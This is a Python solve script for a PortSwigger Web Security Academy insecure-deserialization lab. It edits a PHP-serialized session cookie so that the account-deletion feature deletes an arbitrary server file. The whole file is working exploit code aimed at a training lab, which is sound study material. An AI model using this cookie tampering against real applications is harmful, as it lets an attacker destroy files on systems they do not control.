#!/usr/bin/env python3
"""
Using application functionality to exploit insecure deserialization
PortSwigger Web Security Academy -- Insecure Deserialization

Companion script for the writeup: 03-using-application-functionality.md

What this does:
    Logs in (gregg/rosebud first, since the exploit's trigger is a self
    account deletion and a backup account preserves wiener for retries;
    falls back to wiener/peter), decodes the PHP-serialized session cookie,
    repoints whichever avatar-path attribute is present (tried in order:
    avatar_link, image_location, avatar, profile_picture) at
    /home/carlos/morale.txt, and submits POST /my-account/delete. The
    account-deletion feature cleans up the avatar file at the path stored in
    the session object -- which is no longer the account's own avatar.

Usage:
    python 03-using-application-functionality.py <lab-url>
    e.g. python 03-using-application-functionality.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import base64
import re
import sys
import urllib.parse

import httpx


def _login(client: httpx.Client, base_url: str, username: str, password: str) -> str:
    login_page = client.get(f"{base_url}/login")
    csrf_match = re.search(r'name="csrf"\s+value="([^"]+)"', login_page.text)
    csrf = csrf_match.group(1) if csrf_match else None
    login_data = {"username": username, "password": password}
    if csrf:
        login_data["csrf"] = csrf
    client.post(f"{base_url}/login", data=login_data)
    return client.cookies.get("session")


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    session = None
    for user, pw in [("gregg", "rosebud"), ("wiener", "peter")]:
        session = _login(client, lab_url, user, pw)
        if session:
            print(f"[+] Logged in as {user}")
            break
    if not session:
        print("[-] Both accounts failed to log in")
        return

    # URL-decode then base64-decode, fixing padding since the cookie value
    # coming off the wire isn't guaranteed to be a multiple of 4 chars long.
    url_decoded = urllib.parse.unquote(session)
    padded = url_decoded + "=" * (4 - len(url_decoded) % 4) if len(url_decoded) % 4 else url_decoded
    decoded = base64.b64decode(padded).decode("utf-8", errors="replace")
    print(f"[*] Decoded session cookie: {decoded}")

    target_file = "/home/carlos/morale.txt"
    modified = decoded
    matched_attr = None
    for attr in ["avatar_link", "image_location", "avatar", "profile_picture"]:
        if attr in decoded:
            modified = re.sub(
                rf's:{len(attr)}:"{re.escape(attr)}";s:\d+:"[^"]+";',
                f's:{len(attr)}:"{attr}";s:{len(target_file)}:"{target_file}";',
                decoded,
            )
            matched_attr = attr
            print(f"[*] Repointed {attr} -> {target_file}")
            break
    else:
        print("[-] No known avatar-path attribute found in the decoded cookie")
        return

    print(f"[*] Modified cookie: {modified}")
    tampered_cookie = base64.b64encode(modified.encode()).decode()

    # A fresh client + raw Cookie header, to avoid the login client's cookie
    # jar re-encoding the value in a way the server won't accept.
    r = httpx.post(
        f"{lab_url}/my-account/delete",
        headers={"Cookie": f"session={tampered_cookie}"},
        follow_redirects=True,
        timeout=15,
    )
    print(f"[*] POST /my-account/delete (attribute={matched_attr}) -> {r.status_code}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print(f"[+] Lab solved -- {target_file} deleted as a side effect of account deletion.")
    else:
        print("[-] Not solved yet -- try one of the other candidate attribute names.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
